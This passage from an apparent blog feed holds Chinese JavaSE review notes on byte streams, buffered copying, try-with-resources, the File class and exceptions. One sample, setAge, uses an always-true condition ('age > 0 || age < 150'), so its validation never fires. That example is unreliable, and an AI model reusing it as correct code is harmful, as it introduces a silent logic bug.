class="line"></span><br><span class="line">fis.<span class="built_in">close</span>();</span><br><span class="line"><span class="comment">//关流释放资源</span></span><br><span class="line">fos.<span class="built_in">close</span>();</span><br></pre></td></tr></table></figure><p>ps：他有个缺点，那就是效率非常的慢，因为需要一个字节一个字节的读然后写。</p><h3 id="利用IO流进行文件拷贝例程三之——BufferedInputStream和BufferOutputStream拷贝"><a href="#利用IO流进行文件拷贝例程三之——BufferedInputStream和BufferOutputStream拷贝" class="headerlink" title="利用IO流进行文件拷贝例程三之——BufferedInputStream和BufferOutputStream拷贝"></a>利用IO流进行文件拷贝例程三之——<code>BufferedInputStream和BufferOutputStream拷贝</code></h3><blockquote><p>字节流一次读写一个数组的速度明显比一次读写一个字节的速度快很多，<br>这是加入了数组这样的缓冲区效果，java本身在设计的时候，<br>也考虑到了这样的设计思想(装饰设计模式后面讲解)，所以提供了字节缓冲区流</p></blockquote><ul><li>BufferedInputStream<blockquote><p>BufferedInputStream内置了一个缓冲区(数组)<br>从<code>BufferedInputStream</code>中读取一个字节时<br><code>BufferedInputStream</code>会一次性从文件中读取8192个, 存在缓冲区中<br>程序再次读取时, 就不用找文件了, 直接从缓冲区中获取<br>直到缓冲区中所有的都被使用过, 才重新从文件中读取8192个</p></blockquote></li><li>BufferedOutputStream<blockquote><p><code>BufferedOutputStream</code>也内置了一个缓冲区(数组)<br>程序向流中写出字节时, 不会直接写到文件, 先写到缓冲区中<br>直到缓冲区写满, BufferedOutputStream才会把缓冲区中的数据一次性写到文件里</p></blockquote></li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"致青春.mp3"</span>);</span><br><span class="line"><span class="comment">//创建文件输入流对象,关联致青春.mp3</span></span><br><span class="line"></span><br><span class="line">BufferedInputStream bis = <span class="keyword">new</span> BufferedInputStream(fis);</span><br><span class="line"><span class="comment">//创建缓冲区对fis装饰</span></span><br><span class="line"></span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"copy.mp3"</span>);</span><br><span class="line"><span class="comment">//创建输出流对象,关联copy.mp3</span></span><br><span class="line"></span><br><span class="line">BufferedOutputStream bos = <span class="keyword">new</span> BufferedOutputStream(fos);</span><br><span class="line"><span class="comment">//创建缓冲区对fos装饰</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> b;</span><br><span class="line"><span class="built_in">while</span>((b = bis.<span class="built_in">read</span>()) != <span class="number">-1</span>) &#123;</span><br><span class="line">bos.<span class="built_in">write</span>(b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bis.<span class="built_in">close</span>();</span><br><span class="line"><span class="comment">//只关装饰后的对象即可</span></span><br><span class="line">bos.<span class="built_in">close</span>();</span><br></pre></td></tr></table></figure><h3 id="flush和close的区别"><a href="#flush和close的区别" class="headerlink" title="flush和close的区别"></a>flush和close的区别</h3><blockquote><p>1、flush只是刷新缓冲区，后面还可以写（默认缓冲区存满放到文件，为了拷贝文件的完整性，拷贝完之后一定要刷新缓冲区，缓冲区也就是那个数组）</p><ul><li>ps：<br>一般用带Buffered的IO文件流才用的到，自己创建缓冲区每次都存到文件里去了。</li></ul></blockquote><blockquote><p>2、close是关闭流，不过在关闭流之前会刷新一便缓冲区，关闭后不能写。</p></blockquote><h3 id="使用jdk封装好的带Buffered的字节流类与手动创建字节缓冲区效率的区别"><a href="#使用jdk封装好的带Buffered的字节流类与手动创建字节缓冲区效率的区别" class="headerlink" title="使用jdk封装好的带Buffered的字节流类与手动创建字节缓冲区效率的区别"></a>使用<code>jdk封装好的带Buffered的字节流类</code>与<code>手动创建字节缓冲区</code><strong>效率</strong>的区别</h3><blockquote><p>1、带Buffered的封装类实现文件复制会有<code>两个缓冲区</code><br>ps:BufferedReader是先将数据抓取到<code>内存的缓冲区</code>再<code>从缓冲区中读取字节或数组</code>，操作的是Buffer里的数据（非底层硬盘的数据）</p><p>2、自己手动创建缓冲区的话有<code>一个缓冲区就能实现文件复制</code></p><p>3、但是两个缓冲区都是再<code>内存中</code>的，所以他们之间的赋值对效率<code>不会有很大影响</code></p><p>4、得出结论：手动创建缓冲区比Buffered封装类效率<code>相对高一点点</code></p></blockquote><h3 id="1-6版本和之前流的标准异常处理代码（面试会用到，背都要背下来）"><a href="#1-6版本和之前流的标准异常处理代码（面试会用到，背都要背下来）" class="headerlink" title="1.6版本和之前流的标准异常处理代码（面试会用到，背都要背下来）"></a><strong>1.6版本和之前流的标准异常处理代码（面试会用到，背都要背下来）</strong></h3><ul><li>try finally嵌套<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">FileInputStream fis = <span class="keyword">null</span>;</span><br><span class="line">FileOutputStream fos = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">fis = <span class="keyword">new</span> FileInputStream(<span class="string">"aaa.txt"</span>);</span><br><span class="line">fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"bbb.txt"</span>);</span><br><span class="line"><span class="keyword">int</span> b;</span><br><span class="line"><span class="keyword">while</span>((b = fis.<span class="keyword">read</span>()) != -<span class="number">1</span>) &#123;</span><br><span class="line">fos.<span class="keyword">write</span>(b);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(fis != <span class="keyword">null</span>)</span><br><span class="line">fis.close();<span class="comment">//能关掉一个算一个</span></span><br><span class="line">&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(fos != <span class="keyword">null</span>)</span><br><span class="line">fos.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="1-7版本新特性之异常处理的标准代码："><a href="#1-7版本新特性之异常处理的标准代码：" class="headerlink" title="1.7版本新特性之异常处理的标准代码："></a>1.7版本新特性之异常处理的标准代码：</h3><ul><li><p>新特性：</p><blockquote><p>在try后接一个小括号，我们把流对象写在小括号内，程序运行完之后自动关闭流</p></blockquote></li><li><p>为什么会自动关闭流？</p><blockquote><p>因为，FileInputStream 与 FileOutputStream 类都实现了AutoCloseable接口，当然我们自己写个类然后重写close方法也能实现自动关闭</p></blockquote></li><li><p>注意事项：</p><blockquote><p>在开发中用到的不多，但是要知道，因为面试肯能会遇到。</p></blockquote></li></ul><ul><li>try close<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">try</span>(</span><br><span class="line">FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"aaa.txt"</span>);</span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"bbb.txt"</span>);</span><br><span class="line">MyClose mc = <span class="keyword">new</span> MyClose();</span><br><span class="line">)&#123;</span><br><span class="line"><span class="keyword">int</span> b;</span><br><span class="line"><span class="built_in">while</span>((b = fis.<span class="built_in">read</span>()) != <span class="number">-1</span>) &#123;</span><br><span class="line">fos.<span class="built_in">write</span>(b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="拓展知识之——文件加密"><a href="#拓展知识之——文件加密" class="headerlink" title="拓展知识之——文件加密"></a>拓展知识之——文件加密</h3><ul><li>原理<blockquote><p>我们知道2 ^ 3 = 1这是个异或运算也就是0010 ^ 0011 = 0001.</p><p>那么我们就可以</p><p><code>源数据 ^ 密文 = 加密后的数据</code><br><code>加密后的数据 ^ 密文 = 源数据</code></p><p>通过异或这个原理，我们可以知道用<code>相同数异或两编，那么原来的数就会回来</code>，这样我们就可以再写出字节流时，把写出的数据进行一遍异或运算，这样就达到了加密的效果，解密就是读取的时候再异或<strong><code>同样的数</code></strong>，这样原来的数据就回来了，不过这样加密数据为了代码更加简洁就需要使用Buffered的字节流对象，不能自己创建缓冲区了。</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;FileInputStream概述&quot;&gt;&lt;a href=&quot;#FileInputStream概述&quot; class=&quot;headerlink&quot; title=&quot;FileInputStream概述&quot;&gt;&lt;/a&gt;FileInputStream概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;它是一个输入流，它的作用是从文件系统中的某个文件中获得输入字节，它是&lt;code&gt;InputStream&lt;/code&gt;的子类&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;创建一个文件输入流&quot;&gt;&lt;a href=&quot;#创建一个文件输入流&quot; class=&quot;headerlink&quot; title=&quot;创建一个文件输入流&quot;&gt;&lt;/a&gt;创建一个文件输入流&lt;/h3&gt;&lt;figure class=&quot;highlight haxe&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;FileInputStream fis = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;FileInputStream&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;1.txt&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//其实就是创建一个流的对象，不用了关闭即可&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="IO流" scheme="http://liuhaoan.github.io/tags/IO%E6%B5%81/"/>
    
      <category term="文件字节流" scheme="http://liuhaoan.github.io/tags/%E6%96%87%E4%BB%B6%E5%AD%97%E8%8A%82%E6%B5%81/"/>
    
      <category term="标准异常处理代码（面试会用到，背都要背下来）" scheme="http://liuhaoan.github.io/tags/%E6%A0%87%E5%87%86%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E4%BB%A3%E7%A0%81%EF%BC%88%E9%9D%A2%E8%AF%95%E4%BC%9A%E7%94%A8%E5%88%B0%EF%BC%8C%E8%83%8C%E9%83%BD%E8%A6%81%E8%83%8C%E4%B8%8B%E6%9D%A5%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——IO流的概念</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81%E7%9A%84%E6%A6%82%E5%BF%B5/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流的概念/</id>
    <published>2019-04-10T07:08:28.000Z</published>
    <updated>2019-04-10T07:12:34.865Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IO流的概念"><a href="#IO流的概念" class="headerlink" title="IO流的概念"></a>IO流的概念</h1><blockquote><p>1、IO流用来处理设备之间的数据</p><p>2、java对数据的操作时通过流的方式</p><p>3、java用于操作流的类都在IO包中</p><p>4、流按照操作类型分为两种：</p><ul><li><p><strong>字节流：</strong><br>字节流可以操作任何数据，因为在计算机中任何数据都是以字节形式储存的</p></li><li><p><strong>字符流：</strong><br>字符流只能操作纯字符类型的数据，比较方便</p></li></ul></blockquote><a id="more"></a><blockquote><p>5、按照流向分类分为：输入流、输出流</p></blockquote><h3 id="IO流的常用父类"><a href="#IO流的常用父类" class="headerlink" title="IO流的常用父类"></a>IO流的常用父类</h3><ul><li>字节流的抽象父类：<blockquote><p>InputStream（输入流）</p><p>outputStream（输出流）</p></blockquote></li><li>字符流的抽象父类：<blockquote><p>Reader（输入流）</p><p>Writer（输出流）</p></blockquote></li></ul><h3 id="IO的使用"><a href="#IO的使用" class="headerlink" title="IO的使用"></a>IO的使用</h3><blockquote><p>1、使用前，导入IO包</p><p>2、使用时，进行IO异常处理</p><ul><li>ps：<br>因为IO流时处理内存和硬盘之间的关系，如果硬盘没有某个文件，那么会出错</li></ul></blockquote><blockquote><p>3、使用后释放资源</p><ul><li>ps：<br>因为IO流相当于一个建立在内存和硬盘之间的管道，不用了就要把这个管道关闭。</li></ul></blockquote><h3 id="IO流的注意事项"><a href="#IO流的注意事项" class="headerlink" title="IO流的注意事项"></a>IO流的注意事项</h3><blockquote><p>流对象尽量晚开早关</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;IO流的概念&quot;&gt;&lt;a href=&quot;#IO流的概念&quot; class=&quot;headerlink&quot; title=&quot;IO流的概念&quot;&gt;&lt;/a&gt;IO流的概念&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;1、IO流用来处理设备之间的数据&lt;/p&gt;
&lt;p&gt;2、java对数据的操作时通过流的方式&lt;/p&gt;
&lt;p&gt;3、java用于操作流的类都在IO包中&lt;/p&gt;
&lt;p&gt;4、流按照操作类型分为两种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;字节流：&lt;/strong&gt;&lt;br&gt;字节流可以操作任何数据，因为在计算机中任何数据都是以字节形式储存的&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;字符流：&lt;/strong&gt;&lt;br&gt;字符流只能操作纯字符类型的数据，比较方便&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="IO流的概念" scheme="http://liuhaoan.github.io/tags/IO%E6%B5%81%E7%9A%84%E6%A6%82%E5%BF%B5/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——File类</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94File%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——File类/</id>
    <published>2019-04-10T06:54:23.000Z</published>
    <updated>2019-04-10T07:04:54.802Z</updated>
    
    <content type="html"><![CDATA[<h1 id="File的概述"><a href="#File的概述" class="headerlink" title="File的概述"></a>File的概述</h1><blockquote><p>它是文件或者目录的抽象表现形式，其实File更应该叫做一个路径，分为文件路径和文件夹路径，路径分为相对路径和绝对路径。</p></blockquote><h3 id="Flie的实例化"><a href="#Flie的实例化" class="headerlink" title="Flie的实例化"></a>Flie的实例化</h3><ul><li>File(pathname)    <blockquote><p>直接根据一个路径得到File对象</p></blockquote></li><li>File(parent，child)<blockquote><p>parent是父级路径，child是子文件或者文件夹，在一个目录下我们需要处理多个子文件或文件夹时可以更方便</p></blockquote></li><li>File(file, child)<blockquote><p>file是一个File对象，chile是子文件或文件夹，封装成File传入更加强大，可以用到File类中的功能</p></blockquote></li></ul><a id="more"></a><h3 id="File类的方法"><a href="#File类的方法" class="headerlink" title="File类的方法"></a>File类的方法</h3><ul><li>.exists()<blockquote><p>判断文件是否存在，存在true</p></blockquote></li><li>.createNewFile()<blockquote><p>判断是否存在某个文件，不存在创建返回true，存在返回false</p></blockquote></li><li>.mkdir()<blockquote><p>创建文件夹成功返回true，不成功返回false</p></blockquote></li><li>.mkdirs()<blockquote><p>创建多级文件夹</p></blockquote></li><li>.renameTo(file)<blockquote><p>把文件重命名为指定路径</p><ul><li>注意事项：<br>1、如果路径名相同，那就是改名<br>2、如果路径名不同，那就是改名并且剪切</li></ul></blockquote></li><li>.delete()<blockquote><p>删除文件或者文件夹</p><ul><li>注意事项：<br>1、Java中的删除不走回收站<br>2、只能说删除空的文件夹，如果文件夹里面还有内容，就需要遍历一个一个删除</li></ul></blockquote></li></ul><h3 id="File类的判断方法"><a href="#File类的判断方法" class="headerlink" title="File类的判断方法"></a>File类的判断方法</h3><ul><li>.isDirectory()    <blockquote><p>判断是否是目录</p></blockquote></li><li>.isFile()<blockquote><p>判断是否是文件</p></blockquote></li><li>.exists()<blockquote><p>判断是否存在</p></blockquote></li><li>.canRead()    <blockquote><p>判断是否可读</p><ul><li>ps：<br>windows系统的所有文件都是可读的，linux系统就可以不能读</li></ul></blockquote></li><li>.canWrite()<blockquote><p>判断是否可写</p></blockquote></li><li>.isHidden()<blockquote><p>判断是否隐藏</p></blockquote></li></ul><h3 id="File类的获取方法"><a href="#File类的获取方法" class="headerlink" title="File类的获取方法"></a>File类的获取方法</h3><ul><li>.getAbsolutePath()<blockquote><p>获取绝对路径（包括盘符的路径）</p></blockquote></li><li>.getPath()<blockquote><p>获取路径（构造File方法时传入的路径）</p></blockquote></li><li>.geName()<blockquote><p>获取名称</p></blockquote></li><li>.length()<blockquote><p>获取长度（字节数）</p></blockquote></li><li>.lastModified()<blockquote><p>获取最后一次修改时间（毫秒值）</p></blockquote></li><li>.list()<blockquote><p>获取目录下所有文件或文件夹名称，返回一个String数组</p></blockquote></li><li>.listFiles()<blockquote><p>获取目录下所有文件或文件夹名称，返回一个File数组</p></blockquote></li></ul><h3 id="文件名称过滤器FilenameFilter概述"><a href="#文件名称过滤器FilenameFilter概述" class="headerlink" title="文件名称过滤器FilenameFilter概述"></a>文件名称过滤器FilenameFilter概述</h3><blockquote><p>通过重写FilenameFilter类中的accept方法，然后调用list方法获取所有文件时传入可以达到过滤文件的目的</p></blockquote><ul><li>示例：</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span>[] arr = dir.list(<span class="keyword">new</span> FilenameFilter() &#123;</span><br><span class="line"></span><br><span class="line">@Override</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">boolean</span> accept(<span class="built_in">File</span> dir, <span class="keyword">String</span> name) &#123;</span><br><span class="line"><span class="built_in">File</span> file = <span class="keyword">new</span> <span class="built_in">File</span>(dir, name);</span><br><span class="line"><span class="built_in">return</span> file.isFile() &amp;&amp; file.getName().endsWith(<span class="string">".jpg"</span>);</span><br><span class="line"><span class="comment">//重写的accept方法一直返回true则获取到所有文件和文件夹，返回falst则不获取那个文件或者文件夹</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">for</span> (<span class="keyword">String</span> <span class="keyword">string</span> : arr) &#123;</span><br><span class="line">System.out.<span class="built_in">println</span>(<span class="keyword">string</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用递归获取-java结尾的文件："><a href="#利用递归获取-java结尾的文件：" class="headerlink" title="利用递归获取.java结尾的文件："></a>利用递归获取.java结尾的文件：</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args) &#123;</span><br><span class="line">    getFile(<span class="keyword">new</span> <span class="built_in">File</span>(<span class="string">".\\"</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> getFile(<span class="built_in">File</span> f) &#123;</span><br><span class="line">    <span class="built_in">File</span>[] farr = f.listFiles();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">for</span>(<span class="built_in">File</span> name : farr) &#123;</span><br><span class="line">        <span class="built_in">if</span>(name.isFile() &amp;&amp; name.getPath().endsWith(<span class="string">".java"</span>)) &#123;</span><br><span class="line">            System.out.<span class="built_in">println</span>(name.getName());</span><br><span class="line">        &#125;<span class="built_in">else</span> <span class="built_in">if</span>(name.<span class="built_in">isDirectory</span>())&#123;</span><br><span class="line">            getFile(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;File的概述&quot;&gt;&lt;a href=&quot;#File的概述&quot; class=&quot;headerlink&quot; title=&quot;File的概述&quot;&gt;&lt;/a&gt;File的概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;它是文件或者目录的抽象表现形式，其实File更应该叫做一个路径，分为文件路径和文件夹路径，路径分为相对路径和绝对路径。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;Flie的实例化&quot;&gt;&lt;a href=&quot;#Flie的实例化&quot; class=&quot;headerlink&quot; title=&quot;Flie的实例化&quot;&gt;&lt;/a&gt;Flie的实例化&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;File(pathname)    &lt;blockquote&gt;
&lt;p&gt;直接根据一个路径得到File对象&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;File(parent，child)&lt;blockquote&gt;
&lt;p&gt;parent是父级路径，child是子文件或者文件夹，在一个目录下我们需要处理多个子文件或文件夹时可以更方便&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;File(file, child)&lt;blockquote&gt;
&lt;p&gt;file是一个File对象，chile是子文件或文件夹，封装成File传入更加强大，可以用到File类中的功能&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="File类" scheme="http://liuhaoan.github.io/tags/File%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——异常</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%BC%82%E5%B8%B8/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——异常/</id>
    <published>2019-04-10T06:29:06.000Z</published>
    <updated>2019-04-10T06:53:35.384Z</updated>
    
    <content type="html"><![CDATA[<h1 id="异常的概述"><a href="#异常的概述" class="headerlink" title="异常的概述"></a>异常的概述</h1><blockquote><p>异常就是java程序在运行过程中出现的错误</p></blockquote><h3 id="异常类"><a href="#异常类" class="headerlink" title="异常类"></a>异常类</h3><blockquote><p>Throwable</p></blockquote><h3 id="异常的继承体系："><a href="#异常的继承体系：" class="headerlink" title="异常的继承体系："></a>异常的继承体系：</h3><ul><li><p>Throwable</p><ul><li><p>Error</p><blockquote><p>服务器出问提，数据库崩溃等</p></blockquote><ul><li><p>Exception</p><ul><li><p>RuntimeException</p><blockquote><p>这个是运行时异常，全部的运行时异常都在这，一般都是我们自己犯的错误，修改代码即可</p></blockquote></li><li><p>。。。。。等等</p></li></ul></li></ul></li></ul></li></ul><a id="more"></a><h3 id="jvm默认的异常处理机制"><a href="#jvm默认的异常处理机制" class="headerlink" title="jvm默认的异常处理机制"></a>jvm默认的异常处理机制</h3><blockquote><p>会将异常的名称、异常的信息、异常出现的位置打印在控制台，并且程序停止运行。</p></blockquote><h3 id="异常处理命令"><a href="#异常处理命令" class="headerlink" title="异常处理命令"></a>异常处理命令</h3><blockquote><p>try…catch</p></blockquote><ul><li>try<blockquote><p>用来检测异常，如果出现异常，那么会抛出一个对应的异常对象</p></blockquote></li><li>catch<blockquote><p>用来捕获异常，需要定义一个引用来接收异常对象，可以使用多个catch来捕获多种异常。</p><p>ps：理论上是有什么错误用什么去引用，但是实际开发建议直接创建Exception这个父类引用它的子类对象。</p></blockquote></li><li><p>finally</p><blockquote><p>释放资源，一般对io流或者数据库进行关闭</p></blockquote></li><li><p>它们三的常用搭配：</p><blockquote><p>1、try catch<br>异常处理基本格式</p><p>2、try catch finally</p><p>3、try finally</p></blockquote></li></ul><p>ps：。。。。。世界上最真情的相依就是你在try我在catch，无论你发神马脾气，我都静静接收，默默处理。。。。</p><h3 id="小知识："><a href="#小知识：" class="headerlink" title="小知识："></a>小知识：</h3><blockquote><p>1、安卓开发属于客户端开发，一般都是直接Exception</p><p>2、javaEE属于服务端开发，一般都是底层开发，从<code>底层向上抛</code>，最后放到一个错误日志。</p><p>3、在有多个catch时，大的异常放后面，因为根据多态的原理，大的异常放前面没有意义。</p></blockquote><h3 id="jdk7以后如何处理多个异常，有时候面试会问"><a href="#jdk7以后如何处理多个异常，有时候面试会问" class="headerlink" title="jdk7以后如何处理多个异常，有时候面试会问"></a>jdk7以后如何处理多个异常，有时候面试会问</h3><blockquote><p>用<code>“|”</code>连接两个异常类即可实现<code>一个catch处理多个异常</code>，但是这样还不如直接Exception。</p></blockquote><h3 id="java异常的种类"><a href="#java异常的种类" class="headerlink" title="java异常的种类"></a>java异常的种类</h3><blockquote><p>Java异常被分为两大类，分别是编译时异常和运行时异常。</p><ul><li>编译时异常<br>java程序必须显示处理，否则就会发生错误，不处理无法通过编译</li></ul></blockquote><ul><li>运行时异常<blockquote><p>无需显示处理，也可以和编译时异常一样处理</p></blockquote></li></ul><h3 id="Throwable的几个常见方法："><a href="#Throwable的几个常见方法：" class="headerlink" title="Throwable的几个常见方法："></a>Throwable的几个常见方法：</h3><ul><li>.getMessage()<blockquote><p>获取异常信息，返回字符串</p></blockquote></li><li>.toString()<blockquote><p>获取异常类名和异常信息，返回字符串</p></blockquote></li><li>.printStackTrace()    <blockquote><p>获取异常类名和异常信息，以及异常出现在程序中的位置，返回值void，jvm默认用它处理异常。</p></blockquote></li></ul><h3 id="异常抛出"><a href="#异常抛出" class="headerlink" title="异常抛出"></a>异常抛出</h3><blockquote><p>throw new 异常类</p></blockquote><ul><li>注意事项：<blockquote><p>除了<code>RuntimeException类</code>的错误，也就是运行时错误，其他错误都要在方法上使用throws向上抛出这个错误。</p></blockquote></li></ul><ul><li>异常的抛出例子：</li></ul><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(age &gt; <span class="number">0</span> || age &lt; <span class="number">150</span>) &#123;</span><br><span class="line"><span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"年龄非法"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="throw概述"><a href="#throw概述" class="headerlink" title="throw概述"></a>throw概述</h1><blockquote><p>在功能方法内部出现某种情况，程序不能继续运行，需要进行跳转时，就用throw把异常抛出</p></blockquote><h3 id="throws和throw区别，可能面试会问："><a href="#throws和throw区别，可能面试会问：" class="headerlink" title="throws和throw区别，可能面试会问："></a>throws和throw区别，可能面试会问：</h3><ul><li><p>throws</p><blockquote><p>1、用在方法声明后面，跟的时异常类名</p><p>2、可以跟多个异常类名，用逗号隔开</p><p>3、表示这个方法抛出了异常，<code>让方法的调用者来处理</code></p></blockquote></li><li><p>throw</p><blockquote><p>1、用在方法体内部，跟的时异常对象名</p><p>2、只能抛出一个异常对象名，不能接多个</p><p>3、表示这个方法抛出了异常，<code>方法内部处理</code></p></blockquote></li></ul><h3 id="finally特点："><a href="#finally特点：" class="headerlink" title="finally特点："></a>finally特点：</h3><blockquote><p>被finally控制的语句一定会执行，就算执行了return语句finally中的语句也会执行</p><p><strong>特殊情况：</strong><br>在执行到finally之前jvm退出了，比如执行<code>System.exit(0)</code></p></blockquote><h3 id="finally作用"><a href="#finally作用" class="headerlink" title="finally作用"></a>finally作用</h3><blockquote><p>用于资源释放，通常在哎IO流和数据库操作中会使用</p></blockquote><h3 id="finally关键字的面试题："><a href="#finally关键字的面试题：" 